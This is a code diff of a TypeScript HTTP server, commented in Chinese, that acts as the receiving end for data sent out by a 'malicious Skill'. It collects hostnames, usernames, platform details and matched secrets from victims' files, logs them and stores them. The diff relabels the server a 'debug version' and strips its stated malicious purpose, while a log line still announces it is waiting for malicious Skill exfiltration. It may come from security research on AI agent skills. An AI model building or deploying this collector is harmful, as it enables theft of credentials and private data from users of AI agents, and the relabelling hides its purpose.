@@ -1,8 +1,5 @@
 /**
- * Data Collection Server (接收端)
- * 
- * 用于接收恶意 Skill 外发的数据
- * 运行在目标服务器上监听 9999 端口
+ * 数据接收服务器 (调试版)
  */
 
 import * as http from "http";
@@ -12,14 +9,12 @@ import * as path from "path";
 const PORT = 9999;
 const LOG_DIR = "./collected-data";
 
-// 确保日志目录存在
 if (!fs.existsSync(LOG_DIR)) {
   fs.mkdirSync(LOG_DIR, { recursive: true });
 }
 
-// 创建 HTTP 服务器
 const server = http.createServer((req, res) => {
-  // 添加 CORS 头
+  // CORS
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -45,18 +40,24 @@ const server = http.createServer((req, res) => {
       try {
         const data = JSON.parse(body);
         
+        // 兼容不同数据格式
+        const timestamp = data.timestamp || new Date().toISOString();
+        const hostname = data.hostname || "unknown";
+        const username = data.username || "unknown";
+        const platform = data.platform || data.systemInfo?.platform || "unknown";
+        const findings = data.findings || [];
+
         // 打印摘要
-        console.log(`\n时间: ${data.timestamp}`);
-        console.log(`主机: ${data.hostname}`);
-        console.log(`用户: ${data.username}`);
-        console.log(`平台: ${data.systemInfo.platform} (${data.systemInfo.arch})`);
-        console.log(`\n发现敏感信息: ${data.findings.length} 处\n`);
+        console.log(`\n时间: ${timestamp}`);
+        console.log(`主机: ${hostname}`);
+        console.log(`用户: ${username}`);
+        console.log(`平台: ${platform}`);
+        console.log(`\n发现敏感信息: ${findings.length} 处\n`);
 
         // 打印详细信息
-        for (const f of data.findings) {
+        for (const f of findings) {
           console.log(`  [${f.type}] ${f.file}`);
-          for (const m of f.matches) {
-            // 屏蔽部分内容
+          for (const m of f.matches || []) {
             const masked = m.length > 20 
               ? m.substring(0, 10) + "..." + m.substring(m.length - 5)
               : m;
@@ -76,8 +77,8 @@ const server = http.createServer((req, res) => {
         
       } catch (error: any) {
         console.error("❌ 解析错误:", error.message);
-        res.writeHead(400);
-        res.end("Bad Request");
+        res.writeHead(400, { "Content-Type": "text/plain" });
+        res.end("Bad Request: " + error.message);
       }
     });
   } else if (req.method === "GET" && req.url === "/health") {
@@ -97,6 +98,5 @@ server.listen(PORT, () => {
   console.log(`接收端点: http://0.0.0.0:${PORT}/api/collect`);
   console.log(`数据目录: ${LOG_DIR}/\n`);
   console.log("等待恶意 Skill 外发数据...\n");
-  console.log("提示: 按 Ctrl+C 停止服务器");
   console.log("=".repeat(60));
 });
